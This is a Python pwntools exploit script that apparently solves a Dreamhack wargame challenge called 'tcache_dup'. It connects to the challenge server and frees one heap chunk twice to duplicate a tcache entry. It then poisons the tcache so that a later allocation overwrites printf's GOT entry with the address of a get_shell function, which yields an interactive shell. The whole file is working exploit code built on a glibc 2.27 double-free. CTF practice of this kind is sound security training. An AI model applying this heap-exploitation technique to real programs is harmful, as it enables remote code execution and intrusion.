from pwn import *

LOCAL = False
if LOCAL:
    p = process("./tcache_dup")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


def create(size, data):
    p.sendlineafter("> ", b"1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)


def delete(idx):
    p.sendlineafter("> ", b"2")
    p.sendlineafter("idx: ", str(idx))


elf = ELF("./tcache_dup")
libc = ELF("./libc-2.27.so")

get_shell = elf.symbols["get_shell"]
printf_got = elf.got["printf"]
print(hex(printf_got))
print(hex(get_shell))
# [1] Tcache Duplication
create(0x30, "dreamhack")
delete(0)
delete(0)

# [2] Tcache Poisoning
create(0x30, p64(printf_got))
create(0x30, "AAAAAAAA")
create(0x30, p64(get_shell))
p.interactive()
